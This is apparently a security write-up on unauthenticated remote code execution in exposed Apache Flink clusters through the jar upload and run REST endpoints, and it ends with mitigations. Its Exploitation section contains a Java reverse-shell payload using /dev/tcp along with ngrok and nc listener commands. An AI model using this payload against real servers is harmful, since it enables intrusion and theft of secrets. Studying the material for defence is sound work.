# Flink my secrets

## Vulnerability
Unauthenticated RCE

## Exploitation
According to [Flink itself](https://flink.apache.org/what-is-flink/security/):
> Apache Flink is a framework for executing user-supplied code in clusters. Users can submit code to Flink processes, which will be executed unconditionally, without any attempts to limit what code can run. Starting other processes, establishing network connections or accessing and modifying local files is possible.  
> (...)  
> **We strongly discourage users to expose Flink processes to the public internet**. Within company networks or “cloud” accounts, we recommend restricting access to a Flink cluster via appropriate means.

Flink's REST API allows uploading and submitting jobs.  
With a default installation of Flink, the web UI provides a tab for this.

Either from browsing the UI, or taking a look at [Flink's REST API documentation](https://nightlies.apache.org/flink/flink-docs-master/docs/ops/rest_api/), we find two interesting endpoints: `/jars/upload` and `/jars/:jarid/run`.

With those, we can submit any JAR to Flink and it will execute it, running whatever code we write, like reading environment variables and sending them to us over internet.  
Or we could use a common reverse shell payload (cf [revshells.com](https://www.revshells.com/)), get a shell on the server and execute any command we want, replacing <HOST> and <PORT> by a server listening at the given port (e.g. open a tcp tunnel `ngrok tcp <LOCAL_PORT>` and then listen `nc -lvnp <LOCAL_PORT>`).
```java
public class App {

    public static void main(String[] args) throws Exception {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

## Fix
The setting `web.submit.enable: false` forbids the upload of jars (it is still possible to submit a job!).  
This behavior is weirdly documented, but confirmed on the [mailing list](https://lists.apache.org/thread/0gz5qf1bnvk7c6ccc5qrz0xm30h3nbyv), and [seems to break the Kubernetes operator](https://www.mail-archive.com/user@flink.apache.org/msg51346.html) for Flink.

An alternative is to limit who can access it.  
Flink doesn't provide authentication mecanism either, so it has to be handled differently. For example it is possible to tunnel the connection to Flink through a proxy that will serve as an authentication layer.
